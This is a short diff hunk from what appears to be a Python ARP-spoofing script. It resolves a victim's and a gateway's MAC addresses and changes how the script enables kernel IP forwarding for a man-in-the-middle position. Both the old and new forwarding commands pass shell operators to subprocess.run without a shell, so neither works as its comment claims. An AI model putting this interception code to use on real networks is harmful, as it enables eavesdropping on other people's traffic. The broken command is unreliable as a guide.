@@ -40,7 +40,7 @@ def main():
     target_mac = get_mac_addresses(target_ip)
     spoof_mac = get_mac_addresses(spoof_ip)
     # enable port forwarding to automatically forward packets recieved from victim to gateway of router
-    subprocess.run([ "echo", "1", ">", "/proc/sys/net/ipv4/ip_forward" ])
+    subprocess.run(["echo", "1", "|", "sudo", "tee", "/proc/sys/net/ipv4/ip_forward"])
     packets_sent = 0
     try:
         while True:
